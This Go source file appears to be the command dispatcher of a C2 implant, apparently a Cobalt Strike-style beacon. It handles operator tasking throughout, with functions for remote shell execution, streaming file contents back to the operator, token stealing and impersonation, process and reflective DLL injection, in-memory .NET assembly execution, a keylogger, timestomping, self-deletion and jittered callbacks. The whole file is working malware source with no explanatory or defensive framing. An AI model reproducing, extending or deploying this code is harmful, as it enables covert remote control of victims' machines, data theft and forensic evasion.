package services

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"main/config"
	"main/crypt"
	"main/packet"
	"main/util"
	"math/big"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func CmdShell(cmdBuf []byte, Token uintptr) ([]byte, error) {
	shellPath, shellBuf, err := packet.ParseCommandShell(cmdBuf)
	if err != nil {
		return nil, err
	}
	//var result []byte
	if shellPath == "" && runtime.GOOS == "windows" {
		go func() {
			_, err = packet.Run(shellBuf, Token)
			if err != nil {
				packet.ErrorProcess(err)
			}
			return
		}()
	} else {
		go func() {
			_, err = packet.Shell(shellPath, shellBuf, Token)
			if err != nil {
				packet.ErrorProcess(err)
			}
			return
		}()
	}
	return []byte("[+] command is executing"), nil
}

func CmdUploadStart(cmdBuf []byte) ([]byte, error) {
	filePath, fileData := packet.ParseCommandUpload(cmdBuf)
	filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
	result, err := packet.Upload(filePathStr, fileData)
	if err != nil {
		return nil, err
	}
	return result, nil
}

func CmdUploadLoop(cmdBuf []byte) ([]byte, error) {
	filePath, fileData := packet.ParseCommandUpload(cmdBuf)
	filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
	result, err := packet.Upload(filePathStr, fileData)
	if err != nil {
		return nil, err
	}
	return result, nil
}

func CmdDownload(cmdBuf []byte) ([]byte, error) {
	filePath := cmdBuf
	strFilePath := string(filePath)
	strFilePath = strings.ReplaceAll(strFilePath, "\\", "/")
	go func() {
		fileInfo, err := os.Stat(strFilePath)
		if err != nil {
			packet.ErrorProcess(err)
			return
		}
		fileLen := fileInfo.Size()
		test := int(fileLen)
		fileLenBytes := packet.WriteInt(test)
		requestID := crypt.RandomInt(10000, 99999)
		requestIDBytes := packet.WriteInt(requestID)
		result := util.BytesCombine(requestIDBytes, fileLenBytes, filePath)
		packet.DataProcess(2, result)

		fileHandle, err := os.Open(strFilePath)
		if err != nil {
			packet.ErrorProcess(err)
			return
		}
		var fileContent []byte
		fileBuf := make([]byte, 1024*1024)
		for {
			n, err := fileHandle.Read(fileBuf)
			if err != nil && err != io.EOF {
				break
			}
			if n == 0 {
				break
			}
			fileContent = fileBuf[:n]
			result = util.BytesCombine(requestIDBytes, fileContent)
			packet.DataProcess(8, result)
			time.Sleep(50 * time.Millisecond)
		}
		packet.DataProcess(9, requestIDBytes)
	}()

	return []byte("[+] Downloading " + strFilePath), nil
}

func CmdFileBrowse(cmdBuf []byte) ([]byte, error) {
	return packet.File_Browse(cmdBuf)
}

func CmdCd(cmdBuf []byte) ([]byte, error) {
	return packet.ChangeCurrentDir(cmdBuf)
}

func CmdTimeStomp(cmdbuf []byte) ([]byte, error) {
	buf := bytes.NewBuffer(cmdbuf)
	to, err := util.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	from, err := util.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	return packet.TimeStomp(from, to)
}

func CmdSleep(cmdBuf []byte) ([]byte, error) {
	sleep := packet.ReadInt(cmdBuf[:4])
	if sleep != 'd' {
		config.WaitTime = time.Duration(sleep) * time.Millisecond
		return []byte("Sleep time changes to " + strconv.Itoa(int(sleep)/1000) + " seconds"), nil
	}
	return nil, nil
}

func CmdPwd() ([]byte, error) {
	return packet.GetCurrentDirectory()
}

func CmdPause(cmdBuf []byte) ([]byte, error) {
	pauseTime := packet.ReadInt(cmdBuf)
	fmt.Println(fmt.Sprintf("Pause time: %d", pauseTime))
	time.Sleep(time.Duration(pauseTime) * time.Millisecond)
	return []byte(fmt.Sprintf("Pause for %d millisecond", pauseTime)), nil
}
func CmdSpawnX64(cmdBuf []byte) ([]byte, error) {
	cmdString := string(cmdBuf)
	cmdString = strings.Replace(cmdString, "ExitProcess", "ExitThread"+"\x00", -1)
	return packet.Spawn_X64([]byte(cmdString))
}

func CmdSpawnX86(cmdBuf []byte) ([]byte, error) {
	cmdString := string(cmdBuf)
	cmdString = strings.Replace(cmdString, "ExitProcess", "ExitThread"+"\x00", -1)
	return packet.Spawn_X86([]byte(cmdString))
}

func CmdExecute(cmdBuf []byte, Token uintptr) ([]byte, error) {
	return packet.Execute(cmdBuf, Token)
}

func CmdGetUid() ([]byte, error) {
	return packet.GetUid()
}

func CmdGetPrivs(b []byte, token uintptr) ([]byte, error) {
	privCnt := int(packet.ReadShort(b[:2]))
	buf := bytes.NewBuffer(b[2:])
	privs := make([]string, privCnt)
	for i := 0; i < privCnt; i++ {
		tmp, err := util.ParseAnArg(buf)
		if err != nil {
			return nil, err
		}
		privs[i] = string(tmp)
	}
	return packet.GetPrivs(privs, token)
}

func CmdStealToken(cmdBuf []byte) (uintptr, []byte, error) {
	pid := packet.ReadInt(cmdBuf[:4])
	return packet.Steal_token(pid)
}

func CmdPs(cmdBuf []byte) ([]byte, error) {
	return packet.ListProcess(cmdBuf)
}

func CmdKill(cmdBuf []byte) ([]byte, error) {
	pid := packet.ReadInt(cmdBuf[:4])
	return packet.KillProcess(pid)
}

func CmdMkdir(cmdBuf []byte) ([]byte, error) {
	return packet.Mkdir(cmdBuf)
}

func CmdDrives(cmdBuf []byte) ([]byte, error) {
	return packet.Drives(cmdBuf)
}

func CmdRm(cmdBuf []byte) ([]byte, error) {
	return packet.Remove(cmdBuf)
}

func CmdCp(cmdBuf []byte) ([]byte, error) {
	return packet.Copy(cmdBuf)
}

func CmdMv(cmdBuf []byte) ([]byte, error) {
	return packet.Move(cmdBuf)
}

func CmdRun2self(Token uintptr) (uintptr, []byte, error) {
	flag, err := packet.Run2self()
	if err != nil {
		return Token, nil, err
	}
	if flag {
		return 0, nil, err
	} else {
		return Token, nil, err
	}
}

func CmdMakeToken(cmdBuf []byte) (uintptr, []byte, error) {
	Token, err := packet.Make_token(cmdBuf)
	if err != nil {
		return 0, nil, err
	}
	return Token, []byte("Make token success"), nil
}

func CmdHandlerJob(cmdBuf []byte) ([]byte, error) {
	return packet.HandlerJob(cmdBuf)
}

func CmdPortscanX64(cmdBuf []byte) ([]byte, error) {
	cmdBuf = bytes.Replace(cmdBuf, []byte("ExitProcess"), []byte("ExitThread"+"\x00"), -1)
	return packet.Spawn_X64(cmdBuf)
}

func CmdPortscanX86(cmdBuf []byte) ([]byte, error) {
	cmdBuf = bytes.Replace(cmdBuf, []byte("ExitProcess"), []byte("ExitThread"+"\x00"), -1)
	return packet.Spawn_X86(cmdBuf)
}

func CmdKeylogger(cmdBuf []byte) ([]byte, error) {
	return packet.HandlerJob(cmdBuf)
}

func CmdExecuteAssemblyX64(cmdBuf []byte) ([]byte, error) {
	_, _, _, description, data, dll, err := ParseExecAsm(cmdBuf)
	if err != nil {
		return nil, errors.New("parameter wrong")
	}
	if string(description) != ".NET assembly" { // data is parameter, dll is reflectivedll
		dll = bytes.ReplaceAll(dll, []byte("ExitProcess"), []byte("ExitThread\x00"))
		return packet.DllInjectSelf(data, dll)
	}
	//data is Csharp, dll is environment
	data = bytes.ReplaceAll(data, []byte("ExitProcess"), []byte("ExitThread\x00"))
	dataBuf := bytes.NewBuffer(data)
	data, _ = util.ParseAnArg(dataBuf)
	dataParam := dataBuf.Bytes()
	param := string(dataParam)

	param = strings.ReplaceAll(param, "\x00", "")
	param = strings.Trim(param, " ")
	params := strings.Split(param, " ")
	return packet.ExecuteAssembly(data, params)
}

func CmdExecuteAssemblyX86(cmdBuf []byte) ([]byte, error) {
	_, _, _, description, data, dll, err := ParseExecAsm(cmdBuf)
	if err != nil {
		return nil, errors.New("parameter wrong")
	}
	if string(description) != ".NET assembly" { // data is parameter, dll is reflectivedll
		dll = bytes.ReplaceAll(dll, []byte("ExitProcess"), []byte("ExitThread\x00"))
		return packet.DllInjectSelf(data, dll)
	}
	//data is Csharp, dll is environment
	data = bytes.ReplaceAll(data, []byte("ExitProcess"), []byte("ExitThread\x00"))
	dataBuf := bytes.NewBuffer(data)
	data, _ = util.ParseAnArg(dataBuf)
	dataParam := dataBuf.Bytes()
	param := string(dataParam)

	param = strings.ReplaceAll(param, "\x00", "")
	param = strings.Trim(param, " ")
	params := strings.Split(param, " ")
	return packet.ExecuteAssembly(data, params)
}

func ParseExecAsm(b []byte) (uint16, uint16, uint32, []byte, []byte, []byte, error) {
	buf := bytes.NewBuffer(b)

	callbackTypeByte := make([]byte, 2)
	sleepTimeByte := make([]byte, 2)
	offset := make([]byte, 4)
	_, _ = buf.Read(callbackTypeByte)
	_, _ = buf.Read(sleepTimeByte)
	_, _ = buf.Read(offset)
	callBackType := packet.ReadShort(callbackTypeByte)
	sleepTime := packet.ReadShort(sleepTimeByte)
	offSet := packet.ReadInt(offset)
	description, err := util.ParseAnArg(buf)
	csharp, err := util.ParseAnArg(buf)
	dll := buf.Bytes()
	return callBackType, sleepTime, offSet, description, csharp, dll, err
}

func CmdImportPowershell(cmdBuf []byte) ([]byte, error) {
	return packet.PowershellImport(cmdBuf)
}

func CmdPowershellPort(cmdBuf []byte, powershellImport []byte) ([]byte, error) {
	return packet.PowershellPort(cmdBuf, powershellImport)
}

func CmdInjectX64(cmdBuf []byte) ([]byte, error) {
	rx64, _ := hex.DecodeString("5265666c6563746976654c6f61646572") //ReflectiveLoader
	rHead, _ := hex.DecodeString("4d5a41525548")
	if bytes.Contains(cmdBuf, rx64) && !bytes.HasPrefix(cmdBuf[8:], rHead) {
		cmdBuf = bytes.ReplaceAll(cmdBuf, []byte("ExitProcess"), []byte("ExitThread\x00"))
		return packet.DllInjectSelf([]byte("\x00"), cmdBuf[8:])
	}
	return packet.InjectProcessRemote(cmdBuf)
}

func CmdInjectX86(cmdBuf []byte) ([]byte, error) {
	rx86, _ := hex.DecodeString("5265666c6563746976654c6f61646572") //ReflectiveLoader
	rHead, _ := hex.DecodeString("4d5a41525548")
	if bytes.Contains(cmdBuf, rx86) && !bytes.HasPrefix(cmdBuf[8:], rHead) {
		cmdBuf = bytes.ReplaceAll(cmdBuf, []byte("ExitProcess"), []byte("ExitThread\x00"))
		return packet.DllInjectSelf([]byte("\x00"), cmdBuf[8:])
	}
	return packet.InjectProcessRemote(cmdBuf)
}

func CmdExit() ([]byte, error) {
	if config.DeleteSelf {
		_, err := packet.DeleteSelf()
		if err != nil {
			return nil, err
		}
		os.Exit(0)
	}
	os.Exit(0)
	return []byte("success exit"), nil
}

func CallbackTime() (time.Duration, error) {
	waitTime := config.WaitTime.Milliseconds()
	jitter := int64(config.Jitter)
	if jitter <= 0 || jitter > 100 {
		return config.WaitTime, nil
	}
	result, err := rand.Int(rand.Reader, big.NewInt(2*waitTime/100*jitter))
	if err != nil {
		return config.WaitTime, err
	}
	waitTime = result.Int64() + waitTime - waitTime/100*jitter
	return time.Duration(waitTime) * time.Millisecond, nil
}
